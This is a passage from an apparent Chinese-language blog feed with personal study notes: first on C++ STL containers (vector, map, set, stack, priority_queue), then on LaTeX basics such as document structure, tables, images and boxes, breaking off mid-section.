<p>​    下面贴一些基本操作</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt;. a.<span class="built_in">size</span>()                 <span class="comment">//获取向量中的元素个数</span></span><br><span class="line"><span class="number">2</span>&gt;. a.<span class="built_in">empty</span>()                <span class="comment">//判断向量是否为空</span></span><br><span class="line"><span class="number">3</span>&gt;. a.<span class="built_in">clear</span>()                <span class="comment">//清空向量中的元素</span></span><br><span class="line"><span class="number">4</span>&gt;. 复制</span><br><span class="line">    a = b ;            <span class="comment">//将b向量复制到a向量中</span></span><br><span class="line"><span class="number">5</span>&gt;. 比较</span><br><span class="line">    保持 ==、!=、&gt;、&gt;=、&lt;、&lt;= 的惯有含义 ;</span><br><span class="line">    如: a == b ;    <span class="comment">//a向量与b向量比较, 相等则返回1</span></span><br><span class="line"><span class="number">6</span>&gt;. 插入 - insert</span><br><span class="line">    ①、 a.<span class="built_in">insert</span>(a.<span class="built_in">begin</span>(), <span class="number">1000</span>);            <span class="comment">//将1000插入到向量a的起始位置前</span></span><br><span class="line">    ②、 a.<span class="built_in">insert</span>(a.<span class="built_in">begin</span>(), <span class="number">3</span>, <span class="number">1000</span>) ;        <span class="comment">//将1000分别插入到向量元素位置的0-2处(共3个元素)</span></span><br><span class="line">    ③、 <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">a</span><span class="params">(<span class="number">5</span>, <span class="number">1</span>)</span> </span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">b</span><span class="params">(<span class="number">10</span>)</span> </span>;</span><br><span class="line">        b.<span class="built_in">insert</span>(b.<span class="built_in">begin</span>(), a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>()) ;        <span class="comment">//将a.begin(), a.end()之间的全部元素插入到b.begin()前</span></span><br><span class="line"><span class="number">7</span>&gt;. 删除 - erase</span><br><span class="line">    ①、 b.<span class="built_in">erase</span>(b.<span class="built_in">begin</span>()) ;                     <span class="comment">//将起始位置的元素删除</span></span><br><span class="line">    ②、 b.<span class="built_in">erase</span>(b.<span class="built_in">begin</span>(), b.<span class="built_in">begin</span>()+<span class="number">3</span>) ;        <span class="comment">//将(b.begin(), b.begin()+3)之间的元素删除</span></span><br><span class="line"><span class="number">8</span>&gt;. 交换 - swap</span><br><span class="line">    b.<span class="built_in">swap</span>(a) ;            <span class="comment">//a向量与b向量进行交换</span></span><br><span class="line"><span class="number">9</span>&gt;. 清空</span><br><span class="line">    b.<span class="built_in">swap</span>(vector&lt;<span class="keyword">int</span>&gt; ());</span><br></pre></td></tr></table></figure>
<p>​    然后就是也可以声明高维向量，例如</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;<span class="built_in">b</span>(<span class="number">10</span>,vector&lt;<span class="keyword">int</span>&gt;(<span class="number">5</span>));</span><br></pre></td></tr></table></figure>
<p>​    另外可以用algorithm头文件中的快排对vector进行排序，不过不知道为什么自定义cmp函数有时候会报错，感觉还是重载运算符更保险一点，<strong>注意这种cmp函数和重载运算符一般都要定义成inline</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span>(vec.<span class="built_in">begin</span>(),vec.<span class="built_in">end</span>(),cmp)</span><br></pre></td></tr></table></figure>
<h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><p>​    map中存放键值对，并且其中自建红黑树，数据有序。在头文件map种定义</p>
<p>​    下面给出map构造和插入的用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">map&lt;<span class="keyword">int</span>,string&gt; Student;<span class="comment">//构造一个map</span></span><br><span class="line"><span class="comment">//下面是插入元素方法</span></span><br><span class="line"><span class="comment">//第一种是用insert函数插入pair</span></span><br><span class="line">Student.<span class="built_in">insert</span>(pair&lt;<span class="keyword">int</span>,string&gt;(<span class="number">000</span>,<span class="string">&quot;zero&quot;</span>));</span><br><span class="line"><span class="comment">//第二种是用insert函数插入value_type数据</span></span><br><span class="line">Student.<span class="built_in">insert</span>(map&lt;<span class="keyword">int</span>,string&gt;::<span class="built_in">value_type</span>(<span class="number">001</span>,<span class="string">&quot;one&quot;</span>));</span><br><span class="line"><span class="comment">//第三种是用数组方式插入，即键值对</span></span><br><span class="line">Student[<span class="number">123</span>]=<span class="string">&quot;lry&quot;</span></span><br><span class="line"><span class="comment">//注意，前两种方式一样，但是由于互异性，存在关键字的时候不能再插入，但是第三种是直接覆盖当前的值。所以这里涉及到插入是否成功，而insert函数返回值是一个pair，其第一个变量是一个map的迭代器，第二个变量反应是否成功。</span></span><br><span class="line">Insert_Pair = Student.<span class="built_in">insert</span>(pair&lt;<span class="keyword">int</span>, string&gt;(<span class="number">1</span>, <span class="string">&quot;student_one&quot;</span>));  </span><br><span class="line"><span class="keyword">if</span>(Insert_Pair.second == <span class="literal">true</span>)  </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Insert Successfully&quot;</span>&lt;&lt;endl;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Insert Failure&quot;</span>&lt;&lt;endl; </span><br><span class="line"><span class="comment">//另外，可以用size()方法得到map大小</span></span><br><span class="line"><span class="keyword">int</span> Size=Student.<span class="built_in">size</span>();</span><br></pre></td></tr></table></figure>
<p>​    然后是遍历与查找，遍历有三种方法，前两种使用迭代器，这里先略过了，等以后有时间回来补充，另外是用数组，这是很显然的。查找也主要有三种方法，第一种，用count判定关键字是否出现，第二种，用<strong>find</strong>函数定位数据出现的位置，返回迭代器，第三种，利用lower_bound函数和lpper_bound函数得到查找关键字的上下界，如果两个迭代器相等，那么就没有这个关键字。</p>
<p>​    然后用clear()函数清空map，用empty()函数判断是否为空。</p>
<p>​    数据删除用erase()函数，下面给出例子，来源于网络</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span>  </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">       map&lt;<span class="keyword">int</span>, string&gt; mapStudent;  </span><br><span class="line">       mapStudent.<span class="built_in">insert</span>(pair&lt;<span class="keyword">int</span>, string&gt;(<span class="number">1</span>, <span class="string">&quot;student_one&quot;</span>));  </span><br><span class="line">       mapStudent.<span class="built_in">insert</span>(pair&lt;<span class="keyword">int</span>, string&gt;(<span class="number">2</span>, <span class="string">&quot;student_two&quot;</span>));  </span><br><span class="line">       mapStudent.<span class="built_in">insert</span>(pair&lt;<span class="keyword">int</span>, string&gt;(<span class="number">3</span>, <span class="string">&quot;student_three&quot;</span>));  </span><br><span class="line">       <span class="comment">//如果你要演示输出效果，请选择以下的一种，你看到的效果会比较好  </span></span><br><span class="line">       <span class="comment">//如果要删除1,用迭代器删除  </span></span><br><span class="line">       map&lt;<span class="keyword">int</span>, string&gt;::iterator iter;  </span><br><span class="line">       iter = mapStudent.<span class="built_in">find</span>(<span class="number">1</span>);  </span><br><span class="line">       mapStudent.<span class="built_in">erase</span>(iter);  </span><br><span class="line">       <span class="comment">//如果要删除1，用关键字删除  </span></span><br><span class="line">       <span class="keyword">int</span> n = mapStudent.<span class="built_in">erase</span>(<span class="number">1</span>);<span class="comment">//如果删除了会返回1，否则返回0  </span></span><br><span class="line">       <span class="comment">//用迭代器，成片的删除  </span></span><br><span class="line">       <span class="comment">//一下代码把整个map清空  </span></span><br><span class="line">       mapStudent.<span class="built_in">earse</span>(mapStudent.<span class="built_in">begin</span>(), mapStudent.<span class="built_in">end</span>());  </span><br><span class="line">       <span class="comment">//成片删除要注意的是，也是STL的特性，删除区间是一个前闭后开的集合  </span></span><br><span class="line">     <span class="comment">//自个加上遍历代码，打印输出吧  </span></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<p>​    最后提一下map的排序，因为我们之前已经说过，map里面的数据有序，但是这是因为上面用到的关键字都是常用类型，本身支持小于号运算，但是如果关键字是自定义结构体，我们就需要重载小于号，来实现插入，如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagStudentInfo</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">       <span class="keyword">int</span>      nID;  </span><br><span class="line">       string   strName;  </span><br><span class="line">       <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (tagStudentInfo <span class="keyword">const</span>&amp; _A) <span class="keyword">const</span>  </span><br><span class="line">       &#123;  </span><br><span class="line">              <span class="comment">//这个函数指定排序策略，按nID排序，如果nID相等的话，按strName排序  </span></span><br><span class="line">              <span class="keyword">if</span>(nID &lt; _A.nID)  <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">              <span class="keyword">if</span>(nID == _A.nID) <span class="keyword">return</span> strName.<span class="built_in">compare</span>(_A.strName) &lt; <span class="number">0</span>;  </span><br><span class="line">              <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">       &#125;  </span><br><span class="line">&#125;StudentInfo, *PStudentInfo;  <span class="comment">//学生信息  </span></span><br></pre></td></tr></table></figure>
<p>​    其实很多东西和vector是差不多的</p>
<h2 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h2><p>​    map基于红黑树实现，而unordered_map基于哈希表。</p>
<p>​    因此，在需要保留一组不同的元素或者不需要遍历的时候用unorder_map，在需要有序数据的时候用map。即查找问题用前者，有顺序要求的时候用后者。</p>
<h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p>​    包含在stack头文件中，用法和其他容器类似</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">stack&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line">s.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line">s.<span class="built_in">top</span>();</span><br><span class="line">s.<span class="built_in">pop</span>();</span><br><span class="line">s.<span class="built_in">empty</span>();</span><br><span class="line">s.<span class="built_in">size</span>();</span><br></pre></td></tr></table></figure>
<p>​    目前主要是写拓扑排序的时候用到了栈，其实用队列也行，毕竟就是用来存放入度为0的结点的。</p>
<h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>​    包含在set头文件中，是一个内部自动有序并且不含重复元素的容器，也就是在插入时进行自动的排列去重</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">set&lt;<span class="keyword">int</span>&gt;st;</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">3</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">2</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">3</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">for</span>(set&lt;<span class="keyword">int</span>&gt;::iterator　it=st.<span class="built_in">begin</span>();it!=st.<span class="built_in">end</span>();it++)</span><br><span class="line">cout&lt;&lt;*it&lt;&lt;<span class="string">&#x27; &#x27;</span>;<span class="comment">//注意这里的遍历只能用迭代器，除了vector和string，其他的容器都不支持直接寻址，最终输出为2 3 4 </span></span><br><span class="line">set.<span class="built_in">find</span>(<span class="number">2</span>);<span class="comment">//返回迭代器</span></span><br><span class="line">set.<span class="built_in">erase</span>(st.<span class="built_in">find</span>(<span class="number">2</span>));<span class="comment">//删除对应的迭代器，一般和find一起使用，当然参数也可以直接是值</span></span><br><span class="line">set.<span class="built_in">erase</span>(st.<span class="built_in">find</span>(<span class="number">3</span>),st.<span class="built_in">end</span>());<span class="comment">//删除一个区间中所有的值</span></span><br><span class="line"><span class="comment">//剩下还有一些函数和上面的容器都差不多，不再赘述</span></span><br></pre></td></tr></table></figure>
<h2 id="unordered-set"><a href="#unordered-set" class="headerlink" title="unordered_set"></a>unordered_set</h2><p>​    unordered_set和set的区别就像是ubordered_map和map的区别一样。</p>
<p>​    set基于红黑树实现，而unordered_set基于哈希表。</p>
<p>​    因此，在需要保留一组不同的元素或者不需要遍历的时候用unorder_set，在需要有序数据的时候用set。即查找问题用前者，有顺序要求的时候用后者。    </p>
<h2 id="优先队列"><a href="#优先队列" class="headerlink" title="优先队列"></a>优先队列</h2><p>​    包含在头文件queue中，用堆实现，每次出队都是优先级最高的那个，和队列不一样的是，优先队列只能通过top()函数访问优先级最高的元素，除了这个剩下的操作都和队列一样</p>
<p>​    下面说一下如何设置优先级。</p>
<p>​    对于基本数据类型，只需要进行如下声明</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">priority_queue&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>,vector&lt;<span class="keyword">int</span>&gt;,less&lt;<span class="keyword">int</span>&gt;&gt; q;</span><br><span class="line"><span class="comment">//以上两种方式一样，因为优先队列默认的是由高到低</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>,vector&lt;<span class="keyword">int</span>&gt;,greater&lt;<span class="keyword">int</span>&gt;&gt; q;</span><br><span class="line"><span class="comment">//由低到高，关键就在于第三个参数，此时最小元素在队首</span></span><br></pre></td></tr></table></figure>
<p>​    那么，如果想要设置结构体的优先级，只需要重载一下运算符就行了，如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fu</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> price;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(fu a,fu b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> a.price&lt;b.price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">priority_queue&lt;fu&gt; q;</span><br></pre></td></tr></table></figure>
<p>​    注意，<strong>重载大于号会编译失败</strong>，因为其实小于号和大于号是一样的，而如果想要让price低的优先级高，只需要将友元函数中的小于号改成大于号就行</p>
<p>​    这里看起来和sort里的cmp函数定义差不多，只是反过来了。另外就是像set一样的类型，也可以通过同样的方式定义优先级。</p>
<p>​    感觉优先队列在求解贪心问题的时候会很简单，比如哈夫曼树的求解，只需要定义一个优先队列然后重复出队入队就行了</p>
<h1 id="出现的错误"><a href="#出现的错误" class="headerlink" title="出现的错误"></a>出现的错误</h1><p>​    这部分主要记录一下刷题过程中出现的错误吧。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>C++</category>
      </categories>
      <tags>
        <tag>编程语言</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>LaTex学习笔记</title>
    <url>/2022/01/17/LaTex%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1>前言</h1>
<p>​	本人采用的是vscode+Tex Live2021，相关配置参考<a href="https://zhuanlan.zhihu.com/p/38178015">LaTex+vscode环境配置</a></p>
<p>​	这里主要是记录一下学习LaTex过程中的一些笔记，主要参考<strong>一份（不太）简短的LaTex介绍</strong>以及知乎Dylaaan的<a href="https://zhuanlan.zhihu.com/p/456055339">LaTex新手教程</a></p>
<h1>概述</h1>
<h2 id="文件结构"><a class="header-anchor" href="#文件结构">¶</a>文件结构</h2>
<p>​	先看一下LaTeX的程序结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\documentclass&#123;&#125;</span><br><span class="line">% 导言区</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">% 正文</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>
<p>​	LaTex源代码以\documentclass{}开头，指定了<strong>文档类</strong>，在导言区中通常会用\usepackage命令调用<strong>宏包</strong>，并进行相关设置</p>
<h2 id="部分概念"><a class="header-anchor" href="#部分概念">¶</a>部分概念</h2>
<p>​	先来看第一个LaTeX程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">    ``Hello World!&#x27;&#x27; from \LaTeX</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>
<p>​	LaTeX中的命令以反斜杠开头，后面可以跟字母或者非字母（例如**\$**），这对应了它的两种形式，字母形式的命令是忽略了命令后面的空格的，而如果在命令后加花括号可以阻止其忽略空格，这种方式仅仅只是加了一个间距，也可以使用反斜线加空格命令，部分命令可跟参数，可选参数用方括号，必选参数用花括号。</p>
<p>​	LaTeX中有<strong>环境</strong>概念，用命令\begin和\end来说明，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\begin&#123;env&#125;[]&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\end&#123;env&#125;[]&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>​	其环境名应该一致。</p>
<p>​	有的命令还会对其后所有命令产生作用，这个时候需要使用<strong>分组</strong>，用花括号表示，在分组中使用的命令只会影响到分组</p>
<p>​	文档类规定了LaTeX源代码生成文档的性质，主要有如下几种</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326153450400.png" alt="image-20220326153450400"></p>
<p>​	主要命令是\documentclass[可选参数]{文档类型}，这里的可选参数主要是关于整个文档全局的一些设置</p>
<p>​	宏包就是一系列的拓展，相关命令是\usepackage[可选参数]{包名}，可以通过使用逗号隔开来一次调用多个宏包</p>
<h2 id="文件组织方式"><a class="header-anchor" href="#文件组织方式">¶</a>文件组织方式</h2>
<p>​	在撰写很长的文章的时候，可以将每章内容单独写在独立文件中</p>
<p>​	可以用\include{}命令来插入文件，使用绝对路径或相对路径都行，不过这个命令会在读入文件之前另起一页，如果不需要的话可以使用\input{}命令。</p>
<p>​	在导言区可以使用\includeonly{}命令来组织文件，只有花括号中出现的文件才能在后续进行插入。</p>
<p>​	最后介绍一个宏包<strong>syntonly</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\usepackage&#123;syntonly&#125;</span><br><span class="line">\syntonly</span><br></pre></td></tr></table></figure>
<p>​	这样会只编译而不生成LaTeX文件，速度会比较快</p>
<h1>用LaTeX排版文字</h1>
<h2 id="字符"><a class="header-anchor" href="#字符">¶</a>字符</h2>
<h3 id="常见字符"><a class="header-anchor" href="#常见字符">¶</a>常见字符</h3>
<p>​	在源文件中，空格和tab键被视为空格，连续多个空格被视为一个空格。</p>
<p>​	行末的换行符也会被视为空格，而连续两个换行符则是分段，也可以使用\par进行换行。</p>
<p>​	采用**%**作为注释。</p>
<p>​	特殊字符有对应的作用，需要用反斜线进行转义，而两个反斜线被定义成了手动换行的命令，<strong>\textbackslash</strong>输入了反斜线。</p>
<p>​	在进行英文论写作的时候，经常会出现连体字符，可以在两个单字符之间加入一对大括号来避免这一点</p>
<h3 id="标点符号"><a class="header-anchor" href="#标点符号">¶</a>标点符号</h3>
<p>​	中文的标点符号直接用中文输入法输入即可，但是英文的会有一些问题</p>
<p>​	英文单引号对是`‘，双引号对是``’’</p>
<p>​	有三种长度的横线，分别使用-，–，—可以编译出来，连字号表示复合词，短破折号用来连接数字表示范围，长破折号用来连接单词</p>
<p>​	省略号用命令**\ldots**，也可以用命令**\dots**</p>
<p>​	波浪号用命令**~**，不过平常其实很少用到</p>
<h3 id="其它字符"><a class="header-anchor" href="#其它字符">¶</a>其它字符</h3>
<p>​	可以输出很多扩展的拉丁字符，像是重音什么的</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326153609799.png" alt="image-20220326153609799"></p>
<h2 id="断行和断页"><a class="header-anchor" href="#断行和断页">¶</a>断行和断页</h2>
<p>​	可以用字符~生成一个不会断行的空格</p>
<p>​	可以用**\newline**进行断行</p>
<h1>文档元素</h1>
<h2 id="章节和目录"><a class="header-anchor" href="#章节和目录">¶</a>章节和目录</h2>
<h3 id="章节标题"><a class="header-anchor" href="#章节标题">¶</a>章节标题</h3>
<p>​	可以用如下命令来划分章节</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\chapter&#123;⟨title⟩&#125; \section&#123;⟨title⟩&#125; \subsection&#123;⟨title⟩&#125;</span><br><span class="line">\subsubsection&#123;⟨title⟩&#125; \paragraph&#123;⟨title⟩&#125; \subparagraph&#123;⟨title⟩&#125;</span><br></pre></td></tr></table></figure>
<p>​	注意\chapter命令只在book和report中有定义</p>
<p>​	每个命令都有可变参数，用来设置页眉和页脚</p>
<p>​	然后像section、subsection、subsubsection对应了三级标题，可以自动标号，但是paragraph没有自动标号的功能，是低层次的</p>
<h3 id="目录"><a class="header-anchor" href="#目录">¶</a>目录</h3>
<p>​	在合适的地方用**\tableofcontents<strong>来生成目录，那种用*作为可变参数或者是没有可变参数的章节不会写入目录，可以在标题命令后面使用</strong>\addcontentsline{}{level}{title}**</p>
<h3 id="标题页"><a class="header-anchor" href="#标题页">¶</a>标题页</h3>
<p>​	可以用LaTeX生成简单的标题页，首先要给出信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\title&#123;&#125;	\author&#123;&#125;	\date&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>​	在其中可以用**\thanks**命令生成标题页的脚注</p>
<p>​	最后使用**\maketitle**即可</p>
<h2 id="交叉引用"><a class="header-anchor" href="#交叉引用">¶</a>交叉引用</h2>
<p>​	交叉引用是比较重要的一点，在可以使用交叉引用的地方使用**\label{}<strong>命令，然后在别的地方使用</strong>\ref{label-name}<strong>或</strong>\pageref{label-name}**命令就可以生成标号或者页码</p>
<h2 id="角标和边注"><a class="header-anchor" href="#角标和边注">¶</a>角标和边注</h2>
<p>​	使用**\footnote{}**命令可以在页面底部生成一个脚注</p>
<p>​	在表格和各种盒子中可能无法正确的生成脚注，这个时候可以先用**\footnotemark<strong>给脚注计数，然后再在合适的地方用</strong>\footnotetext**来生成脚注</p>
<p>​	然后是可以用**\marginpar**生成边注</p>
<h2 id="特殊环境"><a class="header-anchor" href="#特殊环境">¶</a>特殊环境</h2>
<h3 id="列表"><a class="header-anchor" href="#列表">¶</a>列表</h3>
<p>​	有基本的有序和无序列表环境enumerate和itemize，都用**\item**标明每个列表项，可以带一个可选参数，将有序列表的计数或者无序列表的符号替换成自定义符号</p>
<p>​	关键字环境description用法类似，不同的是item后面的可选参数可以用来写关键字</p>
<p>​	各级无序列表的符号由命令**\labellitemi<strong>到</strong>\labellitemiv<strong>定义，可以用</strong>\renewcommand{}{}**来进行重定义</p>
<p>​	有序列表符号由命令**\labelenumi<strong>到</strong>\labelenumiv**定义，重定义需要使用计数器相关的命令</p>
<h3 id="对齐环境"><a class="header-anchor" href="#对齐环境">¶</a>对齐环境</h3>
<p>​	center、flushleft和flushright环境分别用于生成居中、左对齐和右对齐的文本环境，也可以使用**\centering**、<strong>\raggedright</strong>、<strong>\raggedleft</strong>来进行对其</p>
<h3 id="引用环境"><a class="header-anchor" href="#引用环境">¶</a>引用环境</h3>
<p>​	主要提供了两种引用的环境，quote用于引用较短的文字，首行不缩进，quotation用于引用若干段文字，首行缩进</p>
<p>​	verse用来排版诗歌，首行悬挂缩进</p>
<h3 id="摘要环境"><a class="header-anchor" href="#摘要环境">¶</a>摘要环境</h3>
<p>​	abstract，一般紧跟在maketitle后面</p>
<h3 id="代码环境"><a class="header-anchor" href="#代码环境">¶</a>代码环境</h3>
<p>​	如果要原意敲代码的话，需要用到verbatim，后接星号可以显示空格</p>
<p>​	<strong>\verb</strong>可以用来排版简短的代码，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\verb | \LaTeX |</span><br></pre></td></tr></table></figure>
<p>​	然后listings宏包可以生成关键字高亮的代码环境</p>
<h2 id="表格"><a class="header-anchor" href="#表格">¶</a>表格</h2>
<p>​	基本表格环境的用法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\begin&#123;tabular&#125;[⟨align⟩]&#123;⟨column-spec⟩&#125;</span><br><span class="line">⟨item1⟩ &amp; ⟨item2⟩ &amp; … \\</span><br><span class="line">\hline</span><br><span class="line">⟨item1⟩ &amp; ⟨item2⟩ &amp; … \\</span><br><span class="line">\end&#123;tabular&#125;</span><br></pre></td></tr></table></figure>
<p>​	其中column-spec是列格式标记，&amp;用来分割单元格，\\用来换行，<strong>\hline</strong>用来在行与行之间绘制横线</p>
<h3 id="列格式"><a class="header-anchor" href="#列格式">¶</a>列格式</h3>
<p>​	tabular环境用列格式指定表格的列数和每列的格式，主要有下面几个参数</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326153639240.png" alt="image-20220326153639240"></p>
<p>​	这里的列格式应该是约束了每一行的格式</p>
<p>​	@格式可以消除单元格前后额外增加的间距</p>
<p>​	还有一种简便的格式参数的写法，即 *{n}{column-spec}</p>
<p>​	如果需要整列修改格式的话，需要使用array宏包，提供了辅助格式&gt;和&lt;，个人感觉也是用类似的方式对某一列进行修饰。</p>
<p>​	比较重要的一点是它可以改变p列格式的对齐方法，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\begin&#123;tabular&#125;</span><br><span class="line">&#123;&gt;&#123;\centering\arraybackslash&#125;p&#123;9em&#125;&#125;</span><br><span class="line">\hline</span><br><span class="line">Some center-aligned long text. \\</span><br><span class="line">\hline</span><br><span class="line">\end&#123;tabular&#125;</span><br></pre></td></tr></table></figure>
<p>​	那个arraybackslash是用来确保成功的</p>
<h3 id="列宽"><a class="header-anchor" href="#列宽">¶</a>列宽</h3>
<p>​	在列宽部分，LaTeX有着明显的不足，可以用array包来让p列对齐</p>
<p>​	tarbularx环境给出了X列参数，是为每一列平均分配了一个宽度，然后再用array包来实现也可以</p>
<h3 id="横线"><a class="header-anchor" href="#横线">¶</a>横线</h3>
<p>​	\hline可以用来画横线，\cline{i-j}可以用来绘制跨越部分单元格的横线，比较常用的还有一种三线表，如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326153712795.png" alt="image-20220326153712795"></p>
<p>​	由<strong>booktabs</strong>宏包支持三线表，用\toprule、\midrule、\bottomrule分别绘制三根线，以及和cline对应的cmidrule</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\begin&#123;tabular&#125;&#123;cccc&#125;</span><br><span class="line">\toprule</span><br><span class="line">&amp; \multicolumn&#123;3&#125;&#123;c&#125;&#123;Numbers&#125; \\</span><br><span class="line">\cmidrule&#123;2-4&#125;</span><br><span class="line">&amp; 1 &amp; 2 &amp; 3 \\</span><br><span class="line">\midrule</span><br><span class="line">Alphabet &amp; A &amp; B &amp; C \\</span><br><span class="line">Roman &amp; I &amp; II&amp; III \\</span><br><span class="line">\bottomrule</span><br><span class="line">\end&#123;tabular&#125;</span><br></pre></td></tr></table></figure>
<h3 id="合并单元格"><a class="header-anchor" href="#合并单元格">¶</a>合并单元格</h3>
<p>​	横向合并单元格用\multicolumn{n}{column-spec}{item}</p>
<p>​	其中n为要合并的列数，column-spec为合并后的格式，item是合并后的值</p>
<p>​	纵向合并单元格用\multirow{n}{width}{item}命令</p>
<p>​	感觉纵向合并一般的格式就是该怎么写怎么写，没被合并的正常用双斜线断行</p>
<h3 id="嵌套表格"><a class="header-anchor" href="#嵌套表格">¶</a>嵌套表格</h3>
<p>​	嵌套表格主要是实现了拆分单元格的效果，此处略过，需要注意的是在嵌套的表格的列格式部分需要使用@{}来保证可以对齐</p>
<h3 id="行距控制"><a class="header-anchor" href="#行距控制">¶</a>行距控制</h3>
<p>​	可以通过如下命令重新修改行间距</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\renewcommand\arraystretch&#123;1.8&#125;</span><br></pre></td></tr></table></figure>
<h2 id="图片"><a class="header-anchor" href="#图片">¶</a>图片</h2>
<p>​	需要借助<strong>graphicx</strong>宏包辅助进行</p>
<p>​	然后用\includegraphics[options]{filename}来加载图片，也提供了\graphicspath{{figures}{logo}}命令，使用这个路径下的图片可以不写路径</p>
<p>​	然后是加载图片的options可以用键值对</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326153738275.png" alt="image-20220326153738275"></p>
<h2 id="盒子"><a class="header-anchor" href="#盒子">¶</a>盒子</h2>
<p>​	盒子是LaTeX排版的基础单元，每一行是一个盒子，里面的元素从左到右依次排列，每一页也是一个盒子，各行文字从上到下依排布</p>
<h3 id="水平盒子"><a class="header-anchor" href="#水平盒子">¶</a>水平盒子</h3>
<p>​	用如下命令生成水平盒子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\mbox&#123;...&#125;</span><br><span class="line">\makebox[width][align]&#123;...&#125;</span><br></pre></td></tr></table></figure>
<p>​	第一个命令生成一个基本的水平盒子，内容只有一行，不允许分段</p>
<p>​	第二个命令可以生成可选参数相关的盒子，可设置宽度和对齐方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\fbox&#123;...&#125;</span><br><span class="line">\framebox[width][align]&#123;...&#125;</span><br></pre></td></tr></table></figure>
<p>​	上面两个命令生成的是有边框版本，可以用\setlength{}{length}命令更改边框宽度</p>
<h3 id="垂直盒子"><a class="header-anchor" href="#垂直盒子">¶</a>垂直盒子</h3>
<p>​	有两种方式可以实现能够换行的盒子</p>
